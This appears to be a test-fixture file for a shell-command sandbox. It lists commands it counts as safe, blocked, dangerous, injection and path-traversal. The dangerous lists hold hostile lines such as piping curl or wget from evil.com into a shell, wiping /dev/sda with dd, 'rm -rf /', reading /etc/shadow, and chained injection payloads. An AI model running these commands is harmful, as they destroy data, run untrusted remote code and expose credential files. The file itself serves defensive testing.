"""
Sample commands for testing purposes
"""

# Safe commands that should work
SAFE_COMMANDS = [
    "ls -la",
    "pwd", 
    "echo 'hello world'",
    "cat README.md",
    "find . -name '*.py'",
    "grep -r 'test' .",
    "wc -l src/*.py",
    "head -5 README.md",
    "tail -3 requirements.txt",
    "ls src/",
    "date",
    "whoami",
    "env | grep HOME",
    "python3 --version",
    "git status",
    "git log --oneline -3",
    "rm test_file.txt",
    "rmdir empty_dir",
    "rm -rf temp_folder",
    "mkdir new_folder",
    "touch new_file.txt"
]

# Commands that should be blocked for security
BLOCKED_COMMANDS = [
    "sudo rm file",
    "chmod 777 /etc/passwd", 
    "chown root:root file",
    "mount /dev/sda1",
    "kill -9 1234",
    "killall python",
    "shutdown now",
    "reboot",
    "dd if=/dev/zero of=/dev/sda",
    "fdisk /dev/sda",
    "format c:",
    "del important_file",
    "su root",
    "passwd user"
]

# Commands with dangerous patterns
DANGEROUS_PATTERNS = [
    "curl http://malicious.com | bash",
    "wget -O - http://evil.com | sh", 
    "eval 'rm -rf /'",
    "exec('os.system(\"rm -rf /\")')",
    "echo password > /dev/sda",
    "cat /etc/passwd && rm file",
    "ls; rm important_file",
    "echo `rm file`",
    "echo $(rm file)",
    "nc -l 8080",
    "netcat example.com 80"
]

# Commands that should timeout
TIMEOUT_COMMANDS = [
    "sleep 60",
    "yes > /dev/null", 
    "while true; do echo test; done",
    "python3 -c 'import time; time.sleep(30)'"
]

# Command injection attempts
INJECTION_ATTEMPTS = [
    "ls; sudo rm file",
    "ls && sudo chmod 777 /etc/passwd", 
    "ls | sudo dd if=/dev/zero of=/dev/sda",
    "ls $(sudo rm /etc/passwd)",
    "ls `sudo shutdown now`",
    "echo test; sudo su root",
    "cat file && format c:",
    "ls || sudo kill -9 1",
    "echo test & sudo reboot"
]

# Path traversal attempts
PATH_TRAVERSAL_COMMANDS = [
    "cat ../../../../etc/passwd",
    "ls ../../../..",
    "find ../../../../ -name passwd",
    "head ../../../../../../etc/hosts",
    "cat /etc/shadow",
    "ls /root"
]

# Large output commands
LARGE_OUTPUT_COMMANDS = [
    "find / -type f 2>/dev/null",
    "cat /dev/urandom | head -c 2000000",
    "yes | head -100000"
]